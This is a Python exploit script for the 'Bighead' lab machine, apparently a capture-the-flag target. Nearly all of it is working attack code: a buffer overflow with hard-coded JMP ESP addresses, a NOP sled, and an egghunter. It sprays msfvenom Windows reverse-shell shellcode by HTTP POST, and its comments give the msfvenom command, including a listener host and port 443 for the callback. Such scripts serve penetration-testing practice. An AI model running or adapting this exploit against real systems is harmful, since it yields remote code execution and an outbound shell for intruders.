#!/usr/bin/python

# This script is taken from Ippsec's Bighead video (https://www.youtube.com/watch?v=VBt-CmjMYiM)
# The egghunter might take a while to find the actual shellcode (could take 5-10 mins)

import requests

rhost = 'dev.bighead.htb'
rport = '80'
url = 'http://' + rhost + ':' + rport

jmp_esp = '\xf0\x12\x50\x62' # 0x625012f0
jmp_eax = '\xf2\x12\x50\x62' # 0x625012f2

# The egghunter will look through the target machine's memory for 'w00tw00t', then when it finds it,
# it executes the shellcode that comes after it
egghunter = ''
egghunter += '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
egghunter += '\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

# a 'nopsled' the size of 'EIP overwrite' ("A"*72) divided by 2, because it's two characters
nopsled = '\x90' * (72 / 2)

# Windows stageless reverse shell payload
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.123 LPORT=443 -f python -v shellcode
shellcode =  "w00tw00t" # This is what the egghunter will look for, then it will execute the shellcode after it
shellcode += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
shellcode += "\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
shellcode += "\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
shellcode += "\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
shellcode += "\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
shellcode += "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
shellcode += "\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
shellcode += "\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
shellcode += "\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
shellcode += "\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
shellcode += "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shellcode += "\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
shellcode += "\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
shellcode += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
shellcode += "\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
shellcode += "\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a"
shellcode += "\x0e\x09\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
shellcode += "\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
shellcode += "\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
shellcode += "\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
shellcode += "\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
shellcode += "\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
shellcode += "\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
shellcode += "\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
shellcode += "\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
shellcode += "\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
shellcode += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

payload = (nopsled + jmp_esp + egghunter).encode('hex')

#fuzz = ''
#fuzz += 'A' * (72 - 8)
#fuzz += 'B' * 8
#fuzz += 'C' * 8
#fuzz += 'D' * 80

# print payload

# Spray the shellcode, then the egghunter can look for it
for i in range(0, 5):
    print 'Spray ' + str(i)
    requests.post(url, data=shellcode)
###

# With this proxy, we can intercept the outgoing http request with burp and remove
# stuff that might take up our buffer space
proxy = {'http':'127.0.0.1:8080'}

print 'Sending payload...'
r = requests.head(url + '/' + payload, proxies=proxy)
print payload
print r.text

